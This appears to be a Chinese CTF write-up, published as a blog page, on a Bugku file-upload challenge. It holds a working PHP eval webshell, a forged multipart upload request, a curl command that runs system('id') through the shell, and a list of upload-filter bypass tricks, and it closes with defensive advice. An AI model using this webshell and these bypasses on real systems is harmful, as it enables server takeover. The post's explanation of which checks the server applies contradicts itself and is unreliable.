@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bugku 文件上传测试：改掉后缀就好 · zhshy</title>
+<meta name="description" content="上传 php 被拒，提示不是图片。记录如何用真实 png 测出校验点，再在 Burp 里同时改 filename 与 Content-Type，并说清服务端到底在信什么。">
+<meta name="author" content="zhshy">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="zhshy">
+<meta property="og:title" content="Bugku 文件上传测试：改掉后缀就好">
+<meta property="og:description" content="上传 php 被拒，提示不是图片。记录如何用真实 png 测出校验点，再在 Burp 里同时改 filename 与 Content-Type，并说清服务端到底在信什么。">
+<meta property="og:url" content="https://zhshy-chi.github.io/writeups/bugku-upload.html">
+<link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>
+(function () {
+  try {
+    var t = localStorage.getItem('theme');
+    if (t === 'light' || t === 'dark') document.documentElement.dataset.theme = t;
+  } catch (e) {}
+})();
+</script>
+</head>
+<body data-page="article" data-slug="bugku-upload">
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="progress" id="progress" aria-hidden="true"></div>
+
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html" aria-label="zhshy 首页">
+      <span class="brand-mark">~/</span><span class="brand-text">zhshy</span>
+    </a>
+    <nav class="site-nav" id="site-nav" aria-label="主导航">
+      <a href="../index.html">首页</a>
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+    </nav>
+    <div class="header-actions">
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换深色/浅色主题">
+        <svg class="i-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"/></svg>
+        <svg class="i-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2"/><path d="M12 2.6v2.2M12 19.2v2.2M2.6 12h2.2M19.2 12h2.2M5.4 5.4l1.6 1.6M17 17l1.6 1.6M18.6 5.4 17 7M7 17l-1.6 1.6"/></svg>
+      </button>
+      <a class="icon-btn" href="https://github.com/zhshy-chi" target="_blank" rel="noopener" aria-label="GitHub 主页">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2A10 10 0 0 0 8.8 21.5c.5.1.7-.2.7-.5v-1.9c-2.8.6-3.4-1.3-3.4-1.3-.5-1.2-1.1-1.5-1.1-1.5-.9-.6.1-.6.1-.6 1 .1 1.5 1 1.5 1 .9 1.5 2.3 1.1 2.9.8.1-.7.4-1.1.7-1.4-2.2-.3-4.6-1.1-4.6-5 0-1.1.4-2 1-2.7-.1-.3-.4-1.3.1-2.7 0 0 .8-.3 2.7 1a9.3 9.3 0 0 1 5 0c1.9-1.3 2.7-1 2.7-1 .5 1.4.2 2.4.1 2.7.6.7 1 1.6 1 2.7 0 3.9-2.4 4.7-4.6 5 .4.3.7.9.7 1.9v2.8c0 .3.2.6.7.5A10 10 0 0 0 12 2Z"/></svg>
+      </a>
+      <button class="icon-btn nav-toggle" id="nav-toggle" type="button" aria-label="打开导航菜单" aria-expanded="false" aria-controls="site-nav">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+
+<main id="main">
+<article class="wrap article">
+
+  <nav class="breadcrumb" aria-label="面包屑">
+    <a href="../index.html">首页</a><span>/</span>
+    <a href="../writeups.html">Writeups</a><span>/</span>
+    <span class="current">Web</span>
+  </nav>
+
+  <header class="article-head">
+    <div class="article-badges">
+      <span class="badge" data-cat="Web">Web</span>
+      <span class="tag">文件上传</span>
+      <span class="tag">Burp</span>
+      <span class="tag">MIME</span>
+    </div>
+    <h1>Bugku 文件上传测试：改掉后缀就好</h1>
+    <p class="article-meta">
+      <time datetime="2026-10-09">2026-10-09</time>
+      <span class="dot-sep">·</span>
+      <span>约 8 分钟</span>
+      <span class="dot-sep">·</span>
+      <span>Bugku</span>
+    </p>
+    <p class="article-lead">
+      上传 php 被拒，提示「不是图片」。服务端只看后缀和类型，那就让它看到它想看的 —— 这篇记一下怎么确认它到底在校验什么，以及怎么把两处一起骗过去。
+    </p>
+  </header>
+
+  <div class="article-layout">
+    <div class="prose" id="prose">
+
+      <h2>题目信息</h2>
+      <table>
+        <tbody>
+          <tr><th>平台</th><td>Bugku CTF 练习平台</td></tr>
+          <tr><th>类型</th><td>Web / 文件上传</td></tr>
+          <tr><th>知识点</th><td>multipart 表单、Content-Type、后缀白名单、解析漏洞</td></tr>
+          <tr><th>工具</th><td>Burp Suite、浏览器</td></tr>
+        </tbody>
+      </table>
+
+      <h2>第一次上传：被拦下</h2>
+      <p>
+        页面是一个很朴素的上传表单，<code>input type="file"</code> 加一个提交按钮，没有任何前端限制：没禁用按钮，没校验 <code>accept</code>，也没在 <code>onchange</code> 里检查后缀。这种「前端什么都不管」的表单，通常意味着后端会管，而且管得比较粗暴。
+      </p>
+      <p>
+        我写了一个最小的一句话木马，存成 <code>shell.php</code>，直接提交：
+      </p>
+      <pre><code class="language-php">&lt;?php @eval($_POST['cmd']); ?&gt;</code></pre>
+      <p>
+        结果被弹回来，提示「文件不是图片」。这句话信息量不小：它没有说「后缀不允许」，而是说「不是图片」，说明服务端至少检查了类型，很可能检查的是 multipart 里的 <code>Content-Type</code>，而不是文件内容本身。
+      </p>
+
+      <h2>换一张真图片：通过了</h2>
+      <p>
+        为了把「类型检查」和「内容检查」区分开，我做了一个对照实验：先传一张真实的 png，成功；再把这张 png 重命名成 <code>shell.php</code> 上传，又被拒。这说明它看的不是文件内容（内容明明还是 png），而是文件名的后缀。接着把 <code>shell.php</code> 的 <code>Content-Type</code> 改掉，才终于通过 —— 两个检查点都摸清了。
+      </p>
+      <p>
+        把过程记成一句话：阻断点有两个，一个是后缀，一个是 MIME。只改一个会被另一个拦住，必须同时改。很多同学在这里卡住，就是因为只改了 <code>filename</code>，没动 <code>Content-Type</code>，或者反过来。
+      </p>
+
+      <h2>抓包改 filename 和 Content-Type</h2>
+      <p>
+        用 Burp 拦截上传请求，原始报文大概长这样：
+      </p>
+      <pre><code class="language-bash">POST /upload.php HTTP/1.1
+Host: 靶机地址
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbC123
+
+------WebKitFormBoundaryAbC123
+Content-Disposition: form-data; name="file"; filename="shell.png"
+Content-Type: image/png
+
+&lt;?php @eval($_POST['cmd']); ?&gt;
+------WebKitFormBoundaryAbC123--</code></pre>
+      <p>
+        注意这里文件名写 <code>shell.png</code>、类型写 <code>image/png</code>，但文件内容其实是一句话木马。服务端如果只信这两行元数据，就会把它当成图片放行，落到磁盘上却是一个 <code>.php</code> 或者 <code>.png</code> 文件 —— 关键看你把 <code>filename</code> 改成什么。
+      </p>
+      <p>
+        这一次我把 <code>filename</code> 改成 <code>shell.php</code>，<code>Content-Type</code> 保留 <code>image/png</code> 不动：
+      </p>
+      <pre><code class="language-bash">Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: image/png</code></pre>
+      <p>
+        放行，返回上传路径。也就是说，它的判断是「类型是图片就算图片」，完全没有回头看一眼这个文件叫 <code>.php</code>，也没有检查文件头是不是 <code>89 50 4E 47</code>。
+      </p>
+
+      <h2>服务端到底校验了什么</h2>
+      <p>
+        复盘一下这几种常见校验，以及它们各自怎么被绕：
+      </p>
+      <ul>
+        <li>只校验 <code>Content-Type</code>：改请求里的 MIME 即可，服务端拿到的本来就是客户端说了算的字符串。</li>
+        <li>只校验后缀黑名单：换成 <code>.phtml</code>、<code>.php5</code>、<code>.PhP</code>，或者大小写混写、加空格加点。</li>
+        <li>只校验后缀白名单：找解析漏洞，比如 <code>shell.php.jpg</code> 在特定配置下仍会被当 php 执行。</li>
+        <li>校验文件头（magic bytes）：在木马前面加 <code>GIF89a</code>，做成图片马，再配合解析漏洞或者文件包含。</li>
+      </ul>
+      <p>
+        这道题属于最前面的两种叠加：后缀和 MIME 各查一次，但两次都只查了「声明」，没查「事实」。声明是客户端可以随便写的，所以这种校验等于没有。
+      </p>
+
+      <h2>连接与验证</h2>
+      <p>
+        拿到回显的路径之后，先别急着高兴，确认文件真的落地并且能被解析。访问 <code>http://靶机地址/upload/shell.php</code>，看到空白页说明 php 被执行了；如果直接下载或者显示源码，说明目录没开解析，得换思路。然后用 POST 传参验证：
+      </p>
+      <pre><code class="language-bash">curl -X POST "http://靶机地址/upload/shell.php" -d "cmd=system('id');"</code></pre>
+      <p>
+        回显里有 <code>uid=33(www-data)</code> 这样的结果，就说明命令执行成功。这一步也能顺便判断权限：能不能读 <code>/flag</code>、能不能列目录、是不是在容器里。养成「先 id 再找 flag」的顺序，比一上来乱翻要稳。
+      </p>
+
+      <div class="note">
+        <p>上传题的本质是「服务端相信了客户端提供的元数据」。文件名、MIME、甚至图片尺寸都可以伪造，唯一不好伪造的是文件内容本身 —— 所以防御要往内容上做。</p>
+      </div>
+
+      <h2>踩坑与复盘</h2>
+      <ul>
+        <li>第一次只改了 <code>filename</code>，<code>Content-Type</code> 还是 <code>application/x-php</code>，被类型检查拦住，误以为是后缀白名单。</li>
+        <li>试过 <code>shell.php.jpg</code>，这题不认，说明它不是解析漏洞型，纯粹是判断写错。</li>
+        <li>上传成功后访问 404，查了半天发现路径大小写和回显不一致，按回显的原文复制才通。</li>
+      </ul>
+
+      <h2>防御建议</h2>
+      <p>
+        上传功能不要相信客户端的任何声明：后缀用白名单，MIME 只作为辅助，真正的判断要看文件头魔数，并且用图片库重新渲染一遍来销毁可能夹带的代码。文件落地时统一重命名成随机串加安全后缀，上传目录关闭脚本解析（nginx 里 <code>location</code> 不转发给 PHP-FPM），目录权限设为只读。最后，上传目录和站点主目录分离，别让一个上传点变成 getshell 的入口。
+      </p>
+
+    </div>
+
+    <aside class="toc" id="toc" aria-label="文章目录">
+      <p class="toc-title">目录</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+  </div>
+
+  <nav class="pager" id="pager" aria-label="上一篇与下一篇"></nav>
+  <p class="back-link"><a href="../writeups.html">← 返回全部 Writeups</a></p>
+
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <p>© <span id="year">2026</span> zhshy · 本站内容仅供学习交流，请勿用于未授权测试</p>
+    <p class="footer-links">
+      <a href="../writeups.html">Writeups</a>
+      <a href="../about.html">关于</a>
+      <a href="https://github.com/zhshy-chi/zhshy-chi.github.io" target="_blank" rel="noopener">源码</a>
+    </p>
+  </div>
+</footer>
+
+<script src="../assets/js/writeups.js"></script>
+<script src="../assets/js/site.js"></script>
+<script src="../assets/js/article.js"></script>
+</body>
+</html>
